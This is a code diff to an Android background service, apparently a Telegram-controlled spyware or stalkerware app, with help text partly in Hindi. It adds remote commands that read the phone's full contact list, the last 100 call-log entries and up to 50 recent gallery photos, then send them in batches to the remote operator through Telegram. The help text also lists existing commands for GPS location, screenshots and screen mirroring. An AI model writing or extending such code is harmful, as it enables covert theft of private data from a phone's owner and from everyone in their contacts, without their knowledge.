@@ -14,7 +14,12 @@ import android.location.LocationManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.IBinder;
+import android.provider.CallLog;
+import android.provider.ContactsContract;
+import android.provider.MediaStore;
 import android.provider.Settings;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
 import androidx.core.app.NotificationCompat;
 import androidx.core.content.ContextCompat;
 import org.json.JSONArray;
@@ -293,6 +298,19 @@ public class SmsService extends Service {
                     "Blocked: " + getBlockedNumbers().size() + " number"
                 );
 
+            } else if (cmd.equalsIgnoreCase("/contacts")) {
+                sendContacts();
+
+            } else if (cmd.equalsIgnoreCase("/calllog")) {
+                sendCallLog();
+
+            } else if (cmd.toLowerCase().startsWith("/gallery")) {
+                int count = 10;
+                try { count = Integer.parseInt(cmd.trim().split("\\s+")[1]); } catch (Exception ignored) {}
+                if (count > 50) count = 50;
+                final int fc = count;
+                new Thread(() -> sendGalleryPhotos(fc)).start();
+
             } else if (cmd.equalsIgnoreCase("/location")) {
                 sendLocation();
 
@@ -329,6 +347,12 @@ public class SmsService extends Service {
                     "/NUMBER-/date DD-MM-YYYY\n" +
                     "/NUMBER-/stop\n" +
                     "/NUMBER-/start\n\n" +
+                    "📒 Contacts & Calls:\n" +
+                    "/contacts — Saare contacts\n" +
+                    "/calllog — Last 100 calls\n\n" +
+                    "🖼 Gallery:\n" +
+                    "/gallery — Last 10 photos\n" +
+                    "/gallery 20 — Last 20 photos (max 50)\n\n" +
                     "📍 Location & Screen:\n" +
                     "/location — GPS location\n" +
                     "/screenshot — Ek screenshot\n" +
@@ -338,6 +362,228 @@ public class SmsService extends Service {
                 );
             }
         }).start();
+    }
+
+    // ─── Contacts ────────────────────────────────────────────
+    private void sendContacts() {
+        new Thread(() -> {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
+                    != PackageManager.PERMISSION_GRANTED) {
+                sendRawMessage("❌ Contacts permission nahi mili.");
+                return;
+            }
+            Cursor cursor = null;
+            try {
+                cursor = getContentResolver().query(
+                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                    new String[]{
+                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+                        ContactsContract.CommonDataKinds.Phone.NUMBER
+                    }, null, null,
+                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
+
+                if (cursor == null || cursor.getCount() == 0) {
+                    sendRawMessage("📵 Koi contact nahi mila.");
+                    return;
+                }
+
+                sendRawMessage("📒 Total Contacts: " + cursor.getCount() + "\nBhej raha hun...");
+
+                StringBuilder sb = new StringBuilder();
+                int batch = 0;
+                while (cursor.moveToNext()) {
+                    String name   = cursor.getString(0);
+                    String number = cursor.getString(1);
+                    if (name == null) name = "Unknown";
+                    if (number == null) number = "-";
+                    sb.append("👤 ").append(name).append("\n📞 ").append(number).append("\n\n");
+                    batch++;
+                    // Send in batches of 30
+                    if (batch >= 30) {
+                        sendRawMessage(sb.toString().trim());
+                        sb.setLength(0);
+                        batch = 0;
+                        try { Thread.sleep(500); } catch (InterruptedException e) { break; }
+                    }
+                }
+                if (sb.length() > 0) sendRawMessage(sb.toString().trim());
+                sendRawMessage("✅ Saare contacts bhej diye!");
+            } catch (Exception e) {
+                sendRawMessage("❌ Contacts error: " + e.getMessage());
+            } finally {
+                if (cursor != null) cursor.close();
+            }
+        }).start();
+    }
+
+    // ─── Call Log ────────────────────────────────────────────
+    private void sendCallLog() {
+        new Thread(() -> {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
+                    != PackageManager.PERMISSION_GRANTED) {
+                sendRawMessage("❌ Call Log permission nahi mili.");
+                return;
+            }
+            Cursor cursor = null;
+            try {
+                cursor = getContentResolver().query(
+                    CallLog.Calls.CONTENT_URI,
+                    new String[]{
+                        CallLog.Calls.NUMBER,
+                        CallLog.Calls.CACHED_NAME,
+                        CallLog.Calls.TYPE,
+                        CallLog.Calls.DURATION,
+                        CallLog.Calls.DATE
+                    }, null, null,
+                    CallLog.Calls.DATE + " DESC LIMIT 100");
+
+                if (cursor == null || cursor.getCount() == 0) {
+                    sendRawMessage("📵 Call log khaali hai.");
+                    return;
+                }
+
+                sendRawMessage("📋 Recent 100 Calls:\n");
+                SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy HH:mm", Locale.getDefault());
+                StringBuilder sb = new StringBuilder();
+                int batch = 0;
+
+                while (cursor.moveToNext()) {
+                    String number = cursor.getString(0);
+                    String name   = cursor.getString(1);
+                    int    type   = cursor.getInt(2);
+                    long   dur    = cursor.getLong(3);
+                    long   date   = cursor.getLong(4);
+
+                    String typeStr;
+                    switch (type) {
+                        case CallLog.Calls.INCOMING_TYPE:  typeStr = "📥 Incoming";  break;
+                        case CallLog.Calls.OUTGOING_TYPE:  typeStr = "📤 Outgoing";  break;
+                        case CallLog.Calls.MISSED_TYPE:    typeStr = "❌ Missed";    break;
+                        case CallLog.Calls.REJECTED_TYPE:  typeStr = "🚫 Rejected";  break;
+                        default:                           typeStr = "📞 Call";      break;
+                    }
+
+                    sb.append(typeStr).append("\n");
+                    if (name != null && !name.isEmpty()) sb.append("Name: ").append(name).append("\n");
+                    sb.append("No: ").append(number).append("\n");
+                    sb.append("Duration: ").append(dur).append("s\n");
+                    sb.append("Time: ").append(sdf.format(new Date(date))).append("\n\n");
+                    batch++;
+
+                    if (batch >= 15) {
+                        sendRawMessage(sb.toString().trim());
+                        sb.setLength(0);
+                        batch = 0;
+                        try { Thread.sleep(400); } catch (InterruptedException e) { break; }
+                    }
+                }
+                if (sb.length() > 0) sendRawMessage(sb.toString().trim());
+                sendRawMessage("✅ Call log bhej diya!");
+            } catch (Exception e) {
+                sendRawMessage("❌ Call log error: " + e.getMessage());
+            } finally {
+                if (cursor != null) cursor.close();
+            }
+        }).start();
+    }
+
+    // ─── Gallery Photos ───────────────────────────────────────
+    private void sendGalleryPhotos(int count) {
+        boolean hasPermission;
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            hasPermission = ContextCompat.checkSelfPermission(this,
+                Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED;
+        } else {
+            hasPermission = ContextCompat.checkSelfPermission(this,
+                Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
+        }
+        if (!hasPermission) {
+            sendRawMessage("❌ Gallery permission nahi mili.");
+            return;
+        }
+
+        Cursor cursor = null;
+        try {
+            Uri mediaUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+            String[] proj = {
+                MediaStore.Images.Media._ID,
+                MediaStore.Images.Media.DISPLAY_NAME,
+                MediaStore.Images.Media.DATA,
+                MediaStore.Images.Media.DATE_ADDED
+            };
+            cursor = getContentResolver().query(
+                mediaUri, proj, null, null,
+                MediaStore.Images.Media.DATE_ADDED + " DESC");
+
+            if (cursor == null || cursor.getCount() == 0) {
+                sendRawMessage("🖼 Gallery khaali hai.");
+                return;
+            }
+
+            int total = Math.min(count, cursor.getCount());
+            sendRawMessage("🖼 Gallery se " + total + " photos bhej raha hun...");
+
+            int sent = 0;
+            int dataIdx = cursor.getColumnIndex(MediaStore.Images.Media.DATA);
+            int nameIdx = cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME);
+            int dateIdx = cursor.getColumnIndex(MediaStore.Images.Media.DATE_ADDED);
+
+            while (cursor.moveToNext() && sent < count) {
+                try {
+                    String path = cursor.getString(dataIdx);
+                    String name = cursor.getString(nameIdx);
+                    long   dateAdded = cursor.getLong(dateIdx);
+                    String dateStr = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault())
+                        .format(new Date(dateAdded * 1000));
+
+                    File orig = new File(path);
+                    if (!orig.exists()) continue;
+
+                    // Compress image before sending
+                    File compressed = compressImage(orig, name);
+                    if (compressed == null) continue;
+
+                    sendPhotoToTelegram(compressed, "🖼 " + name + "\n📅 " + dateStr);
+                    sent++;
+                    Thread.sleep(800);
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            }
+            sendRawMessage("✅ " + sent + " photos bhej diye!");
+        } catch (Exception e) {
+            sendRawMessage("❌ Gallery error: " + e.getMessage());
+        } finally {
+            if (cursor != null) cursor.close();
+        }
+    }
+
+    private File compressImage(File input, String name) {
+        try {
+            BitmapFactory.Options opts = new BitmapFactory.Options();
+            opts.inSampleSize = 2; // shrink to half
+            Bitmap bmp = BitmapFactory.decodeFile(input.getAbsolutePath(), opts);
+            if (bmp == null) return null;
+
+            // Scale down if still too large
+            int maxDim = 1280;
+            if (bmp.getWidth() > maxDim || bmp.getHeight() > maxDim) {
+                float scale = (float) maxDim / Math.max(bmp.getWidth(), bmp.getHeight());
+                Bitmap scaled = Bitmap.createScaledBitmap(bmp,
+                    (int)(bmp.getWidth() * scale), (int)(bmp.getHeight() * scale), true);
+                bmp.recycle();
+                bmp = scaled;
+            }
+
+            File out = new File(getCacheDir(), "img_" + System.currentTimeMillis() + ".jpg");
+            java.io.FileOutputStream fos = new java.io.FileOutputStream(out);
+            bmp.compress(Bitmap.CompressFormat.JPEG, 70, fos);
+            fos.close();
+            bmp.recycle();
+            return out;
+        } catch (Exception e) {
+            return null;
+        }
     }
 
     // ─── Screenshot / Screen Mirror ───────────────────────────
